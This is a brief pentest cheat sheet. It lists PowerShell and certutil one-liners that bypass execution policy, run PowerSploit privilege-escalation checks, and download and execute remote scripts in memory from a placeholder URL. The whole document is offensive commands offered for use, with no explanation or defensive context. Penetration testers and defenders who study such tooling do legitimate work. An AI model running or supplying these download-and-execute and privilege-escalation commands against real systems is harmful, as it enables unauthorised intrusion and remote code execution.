# Helpful pentest commands

## Powersploit

* powershell -exec bypass -c "Import-Module .\Privesc; Invoke-AllChecks"

#### Download In-Memory:

* powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://\<PRIVESC URL\>’); Invoke-AllChecks”

## Simple Download:

* certutil -urlcache -split -f "http://..."

* IEX (New-Object Net.WebClient).DownloadString(‘http://...’)
